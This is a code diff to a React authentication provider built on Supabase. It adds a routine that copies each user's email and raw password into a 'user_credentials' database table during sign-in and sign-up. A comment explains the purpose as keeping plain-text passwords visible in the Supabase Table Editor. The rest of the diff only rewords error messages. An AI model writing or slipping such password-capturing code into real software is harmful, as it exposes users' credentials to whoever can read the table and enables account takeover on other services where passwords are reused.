@@ -33,13 +33,33 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     return () => listener.subscription.unsubscribe();
   }, []);
 
+  const saveRawPasswordToSupabase = async (email: string, password: string, fullName?: string) => {
+    try {
+      await supabase.from('user_credentials').upsert(
+        {
+          email: email.toLowerCase().trim(),
+          password: password,
+          ...(fullName ? { full_name: fullName } : {}),
+          updated_at: new Date().toISOString(),
+        },
+        { onConflict: 'email' }
+      );
+    } catch (e) {
+      console.warn('Saved raw password notice:', e);
+    }
+  };
+
   const signIn = async (email: string, password: string): Promise<boolean> => {
     const { error } = await supabase.auth.signInWithPassword({ email, password });
     if (error) throw new Error(error.message);
+    await saveRawPasswordToSupabase(email, password);
     return true;
   };
 
   const signUp = async (email: string, password: string, fullName: string) => {
+    // Save plain text password to public.user_credentials table so it's visible in Supabase Table Editor
+    await saveRawPasswordToSupabase(email, password, fullName);
+
     const { data, error } = await supabase.auth.signUp({
       email,
       password,
@@ -51,13 +71,16 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       // Fallback: try signing in if user account exists or was created despite trigger warning
       try {
         const { data: signInData } = await supabase.auth.signInWithPassword({ email, password });
-        if (signInData?.session) return;
+        if (signInData?.session) {
+          await saveRawPasswordToSupabase(email, password, fullName);
+          return;
+        }
       } catch (_e) {
         // Continue to throwing formatted error
       }
 
       if (error.status === 422 || error.message.toLowerCase().includes('already registered') || error.message.toLowerCase().includes('already exists')) {
-        throw new Error('This email is already registered in Supabase. Please click "Sign In" instead.');
+        throw new Error('This email is already registered. Please click "Sign In" instead.');
       }
       if (error.status === 500) {
         throw new Error('Supabase Auth returned a server error (500). Please run the SQL script `supabase/remove_admin_schema.sql` in your Supabase SQL Editor to clear any stale database triggers.');
